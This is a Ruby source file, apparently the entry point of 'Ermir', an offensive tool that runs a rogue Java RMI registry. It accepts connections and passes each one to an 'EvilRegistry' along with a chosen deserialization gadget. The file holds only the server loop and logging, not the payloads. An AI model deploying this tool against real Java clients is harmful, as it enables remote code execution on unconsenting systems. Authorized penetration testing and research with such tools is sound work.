require_relative 'ermir/argv_parser'
require_relative 'ermir/utils'
require_relative 'ermir/evil_registry'
require 'socket'
require 'colorize'

module Ermir
  Signal.trap('INT') do
    Ermir::Utils.print_time_msg("execution interrupted by the user, exiting..", :red)
    exit 130
  end

  def self.run
    host, port, gadget = ArgvParser.parse_argv!
    begin
      server = TCPServer.new(host, port)
      Utils.print_time_msg("Ermir started listening for RMI calls at #{server.addr[-1]}:#{server.addr[1]}.", :light_yellow)
      loop do
        Thread.fork(server.accept) do |socket|
          peer = [socket.peeraddr[-1], socket.peeraddr[1]]
          Utils.print_time_msg("connection received from #{peer[0]}:#{peer[1]}.")

          begin
            registry = EvilRegistry.new(socket, gadget)
            registry.handle_connection!
            registry.close_connection!
          rescue SystemCallError => e
            Utils.error_and_abort!(e.to_s, "RMI Registry")
          end

          Utils.print_time_msg("closed the connection to #{peer[0]}:#{peer[1]}.")
        end
      end
    rescue SystemCallError => e
      if Errno.const_defined?(e.class.to_s.split("::").last || e.class.name)
        Utils.error_and_abort!(e.to_s, "TCP Server Binding")
      else
        Utils.error_and_abort!("something went wrong.", "TCP Server Binding", e.to_s)
      end
    end
  end
end